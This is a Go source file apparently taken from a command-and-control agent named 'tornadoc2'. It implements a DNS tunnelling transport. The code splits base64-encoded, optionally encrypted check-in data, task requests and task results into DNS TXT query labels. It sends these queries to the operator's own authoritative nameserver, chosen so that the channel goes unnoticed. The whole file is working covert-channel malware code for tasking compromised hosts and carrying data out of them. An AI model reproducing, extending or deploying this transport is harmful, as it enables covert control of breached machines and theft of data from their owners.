package transport

import (
    "crypto/rand"
    "encoding/base64"
    "encoding/binary"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "strings"
    "time"

    "github.com/miekg/dns"

    "tornadoc2/agent/protocol"
)

const dnsChunkLen = 63

const dnsMaxXferChunks = 1000

type dnsTransport struct {
    domain   string
    resolver string
    sid      string
    client   *dns.Client

    verbB    string
    verbT    string
    verbR    string
    chunkLen int
}

func randomXferID() string {
    var b [8]byte
    if _, err := rand.Read(b[:]); err != nil {
        binary.BigEndian.PutUint64(b[:], uint64(time.Now().UnixNano()))
    }
    return hex.EncodeToString(b[:])
}

func NewDNSTransport(domain, resolver string) (*dnsTransport, error) {
    resolver = strings.TrimSpace(resolver)
    if resolver == "" {
        return nil, errors.New(
            "dns transport: resolver is required " +
            "(point it at the C2's authoritative NS, not a " +
            "public recursive resolver — a public resolver " +
            "defeats the transport's threat model and will not " +
            "forward to an undelegated zone)")
    }
    if !strings.Contains(resolver, ":") {
        resolver += ":53"
    }

    verbB := protocol.DNSVerbB
    if verbB == "" {
        verbB = "b"
    }
    verbT := protocol.DNSVerbT
    if verbT == "" {
        verbT = "t"
    }
    verbR := protocol.DNSVerbR
    if verbR == "" {
        verbR = "r"
    }
    chunkLen := protocol.DNSPayloadChunkSize
    if chunkLen <= 0 || chunkLen > 63 {
        chunkLen = 63
    }

    if verbB == verbT || verbB == verbR || verbT == verbR {
        verbB, verbT, verbR = "b", "t", "r"
    }

    return &dnsTransport{
        domain:   strings.ToLower(strings.Trim(domain, ".")),
        resolver: resolver,
        verbB:    verbB,
        verbT:    verbT,
        verbR:    verbR,
        chunkLen: chunkLen,
        client: &dns.Client{
            Net:     "udp",
            Timeout: 15 * time.Second,
        },
    }, nil
}

func (t *dnsTransport) Name() string { return "dns" }

// ---------------------------------------------------------------------

func splitChunks(s string, n int) []string {
    if s == "" {
        return nil
    }
    out := make([]string, 0, (len(s)+n-1)/n)
    for len(s) > n {
        out = append(out, s[:n])
        s = s[n:]
    }
    if len(s) > 0 {
        out = append(out, s)
    }
    return out
}

func b64urlEncode(b []byte) string {
    return base64.RawURLEncoding.EncodeToString(b)
}

func b64urlDecode(s string) ([]byte, error) {
    return base64.RawURLEncoding.DecodeString(s)
}

func (t *dnsTransport) makeChunkQname(verb, sid, xfer string,
    seq, total int, chunk string) string {

    lengthLabel := fmt.Sprintf("%02x", len(chunk))
    chunkLabel := chunk
    if chunkLabel == "" {
        chunkLabel = "0"
    }
    parts := []string{
        verb,
        sid,
        xfer,
        fmt.Sprintf("%04x", seq),
        fmt.Sprintf("%04x", total),
        lengthLabel,
        chunkLabel,
    }
    parts = append(parts, strings.Split(t.domain, ".")...)
    return strings.Join(parts, ".")
}

func (t *dnsTransport) sendChunked(verb, sid, b64Payload string) ([]byte, error) {
    chunks := splitChunks(b64Payload, t.chunkLen)
    if len(chunks) == 0 {
        // Empty payload. Still send one query so the server sees
        // a complete transfer with total=1.
        chunks = []string{""}
    }
    total := len(chunks)
    if total > dnsMaxXferChunks {
        return nil, fmt.Errorf(
            "dns: payload needs %d chunks, limit is %d",
            total, dnsMaxXferChunks)
    }
    xfer := randomXferID()

    const chunkAttempts = 3

    var lastResp []byte
    for i, c := range chunks {
        qname := t.makeChunkQname(verb, sid, xfer, i, total, c)
        var (
            resp []byte
            err  error
        )
        for attempt := 0; attempt < chunkAttempts; attempt++ {
            resp, err = t.exchange(qname)
            if err == nil {
                break
            }
            time.Sleep(time.Duration(100*(attempt+1)) * time.Millisecond)
        }
        if err != nil {
            return nil, fmt.Errorf(
                "dns: chunk %d/%d xfer=%s: %w",
                i+1, total, xfer, err)
        }
        lastResp = resp
    }
    return lastResp, nil
}

func (t *dnsTransport) exchange(qname string) ([]byte, error) {
    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(qname), dns.TypeTXT)
    m.RecursionDesired = true

    r, _, err := t.client.Exchange(m, t.resolver)
    if err != nil {
        return nil, err
    }

    if r.Truncated {
        tc := &dns.Client{
            Net:     "tcp",
            Timeout: 15 * time.Second,
        }
        r, _, err = tc.Exchange(m, t.resolver)
        if err != nil {
            return nil, fmt.Errorf(
                "dns: UDP reply truncated, TCP retry failed: %w",
                err)
        }
    }
    if r.Rcode != dns.RcodeSuccess {
        return nil, fmt.Errorf("dns rcode %d", r.Rcode)
    }

    var b64 strings.Builder
    for _, rr := range r.Answer {
        if txt, ok := rr.(*dns.TXT); ok {
            for _, s := range txt.Txt {
                b64.WriteString(s)
            }
        }
    }
    if b64.Len() == 0 {
        return []byte{}, nil
    }
    return b64urlDecode(b64.String())
}

func (t *dnsTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	raw, err := t.sendChunked(t.verbB, "new", b64urlEncode(body))
	if err != nil {
		return nil, err
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	var out CheckinResponse
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
    var envelope struct {
        DNSID string `json:"_dns_sid"`
    }
    _ = json.Unmarshal(raw, &envelope)
    if envelope.DNSID == "" {
        return nil, errors.New("checkin reply missing _dns_sid")
    }
    t.sid = envelope.DNSID
    return &out, nil
}

func (t *dnsTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	if t.sid == "" {
		return nil, errors.New("tasks: no session")
	}
	epkChunk := ""
	if wire != nil {
		epk, err := wire.RotateEphemeral()
		if err != nil {
			return nil, fmt.Errorf("dns: rotate epk: %w", err)
		}
		epkChunk = b64urlEncode([]byte(epk))
	}
	raw, err := t.sendChunked(t.verbT, t.sid, epkChunk)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 {
		return nil, nil
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(raw)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			raw = plain
		}
	}
	var tasks []Task
	if err := json.Unmarshal(raw, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *dnsTransport) PostResult(r Result, wire *WireSession) error {
	if t.sid == "" {
		return errors.New("results: no session")
	}
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	_, err = t.sendChunked(t.verbR, t.sid, b64urlEncode(body))
	return err
}

func (t *dnsTransport) Close() error { return nil }